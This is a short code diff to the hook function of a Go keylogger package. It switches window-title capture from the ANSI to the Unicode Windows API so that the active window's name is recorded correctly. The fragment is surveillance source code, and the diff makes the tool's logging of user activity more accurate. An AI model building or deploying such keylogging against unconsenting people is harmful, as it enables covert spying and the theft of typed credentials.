@@ -2,6 +2,7 @@ package keylogger
 
 import (
 	"fmt"
+	"syscall"
 	"time"
 
 	"github.com/Spriithy/gkl/types"
@@ -33,9 +34,9 @@ func (kl *KeyLogger) hook(nCode int, wParam types.WPARAM, lParam types.LPARAM) t
 	threadId := user32.GetWindowThreadProcessId(hWnd, 0)
 	layout := user32.GetKeyboardLayout(threadId)
 
-	var bytes [256]byte
-	user32.GetWindowTextA(hWnd, types.LPCSTR(&bytes[0]), 256)
-	windowName := string(bytes[:])
+	var buf [256]uint16
+	user32.GetWindowTextW(hWnd, types.LPCWSTR(&buf[0]), 256)
+	windowName := syscall.UTF16ToString(buf[:])
 
 	if windowName != kl.previousWindowName {
 		kl.previousWindowName = windowName
